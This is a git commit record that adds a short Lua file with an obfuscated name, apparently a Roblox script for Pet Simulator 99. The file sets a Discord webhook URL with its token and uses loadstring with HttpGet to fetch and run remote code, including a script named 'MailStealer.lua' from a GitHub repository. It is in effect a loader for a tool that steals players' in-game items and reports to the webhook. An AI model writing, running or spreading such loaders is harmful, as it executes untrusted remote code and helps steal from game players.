fed90272ab723c3e30de270c2607f253ca0bf219
oiw <nanailia63@gmail.com>
2025-01-18 15:58:33 -0800

    Add files via upload

---
+++ obf_49zS4P9yL1C49t9Kso8GWamFtXG94Ksr12IWis5C5EtQ5mBzm96gI5ni925tgTLC.lua
@@ -0,0 +1,6 @@
+Username = "Unknow_99099"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1330322346606723165/yVaKJMaZOHGjiZ4msnQdQPbnh93fhtmKRgMax1qQxEgXCor5TIiJHvk6agaG4SQNHbuH" 
+loadstring(game:HttpGet("https://www.roblox.com/games/8737899170/Pet-Simulator-99", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+
